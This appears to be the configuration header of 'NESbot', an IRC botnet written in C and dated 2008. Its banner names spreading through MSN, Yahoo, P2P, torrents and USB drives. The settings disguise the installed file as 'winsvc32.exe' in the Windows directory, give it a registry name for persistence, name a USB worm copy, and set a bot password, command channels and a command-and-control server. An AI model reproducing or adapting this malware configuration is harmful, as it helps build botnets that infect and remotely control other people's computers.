/*
		.   ..---..-. 
		|\  ||   (   )
		| \ ||--- `-. 
		|  \||   (   )[bot - version 5.0 alpha - nov24 2008]
		'   ''---'`-' [msn,tor,yah,p2p,usb,cd-rom,rem-drive]
*/

//file
char xetumhandle[]			= "F8F7R1JG"; // Change me every compile!
char bid[]					= "NESbot";
char szRegname[]	    	= "winsvc32";
char gotopth[]				= "%windir%";
char exename[]				= "winsvc32.exe";
char USB_STR_FILENAME[]		= "DataBlock.exe";

//bot
char prefix					= '.';
char password[]				= "p4ssw0rd";
char authhost1[]			= "*@*";
char *authost[] 			= { authhost1 };

//chans
char MainChan[]				= "#mainchan";		// Main Chan
char TorChan[]				= "#torchan";		// Torrent Chan
char InfoChan[]				= "#infochan";		// Info Chan
char ChanPasses[]			= "";			// Chan Password (for main->info)

//srvr
SERVER sinfo[]={
		{
		"google.net","lol",13,"#mainchan","","-ix","-ix","#infochan",
		},
	};

